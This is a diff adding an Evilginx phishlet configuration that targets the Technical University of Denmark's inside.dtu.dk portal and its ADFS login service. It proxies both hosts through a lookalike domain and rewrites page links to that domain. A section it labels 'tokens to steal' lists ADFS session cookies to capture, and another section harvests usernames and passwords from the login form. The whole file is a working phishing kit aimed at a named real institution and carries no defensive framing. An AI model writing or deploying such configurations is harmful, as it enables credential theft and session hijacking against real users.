@@ -1,0 +1,56 @@
+name: inside_dtu
+author: victor
+min_ver: "2.3.0"                # works with Evilginx 2.4+
+
+# ────────────────────────────────────────────────────────────
+# 1.  PROXY HOSTS
+# ────────────────────────────────────────────────────────────
+# ‑ inside.dtu.dk  → the portal that sends the SAMLRequest
+# ‑ sts.ait.dtu.dk → ADFS login endpoint that sets cookies
+proxy_hosts:
+  - { phish_sub: "",    orig_sub: "",    domain: "inside.dtu.dk",  session: true,  is_login: false }
+  - { phish_sub: "sts", orig_sub: "sts", domain: "ait.dtu.dk",     session: true,  is_login: true  }
+
+# ────────────────────────────────────────────────────────────
+# 2.  SUB‑FILTERS (rewrite absolute links back to phishing host)
+# ────────────────────────────────────────────────────────────
+sub_filters:
+  # Inside DTU pages
+  - { triggers_on: "inside.dtu.dk",
+      orig_sub: "",  domain: "inside.dtu.dk",
+      search: "https://inside.dtu.dk",
+      replace: "https://sts.ait.dtu.vezit.net",
+      mimes: ["text/html","application/javascript","application/json"] }
+
+  # ADFS pages
+  - { triggers_on: "sts.ait.dtu.dk",
+      orig_sub: "sts", domain: "ait.dtu.dk",
+      search: "https://sts.ait.dtu.dk",
+      replace: "https://sts.ait.dtu.vezit.net",
+      mimes: ["text/html","application/javascript","application/json"] }
+
+# ────────────────────────────────────────────────────────────
+# 3.  COOKIES / TOKENS TO STEAL
+#    (names can vary—inspect with devtools if needed)
+# ────────────────────────────────────────────────────────────
+auth_tokens:
+  - domain: "ait.dtu.dk"
+    keys: ["MSISAuth", "MSISAuth1", "MSISLoopDetectionCookie", "SAMLBearerToken", "ADFSAuth"]
+
+# ────────────────────────────────────────────────────────────
+# 4.  OPTIONAL: capture username & password from HTML form
+# ────────────────────────────────────────────────────────────
+credentials:
+  username:
+    key: "UserName"
+    search: "(.*)"
+  password:
+    key: "Password"
+    search: "(.*)"
+
+# ────────────────────────────────────────────────────────────
+# 5.  LOGIN PAGE HINT (helps Evilginx mark the main login path)
+# ────────────────────────────────────────────────────────────
+login:
+  domain: "sts.ait.dtu.dk"
+  path:   "/adfs/ls/"
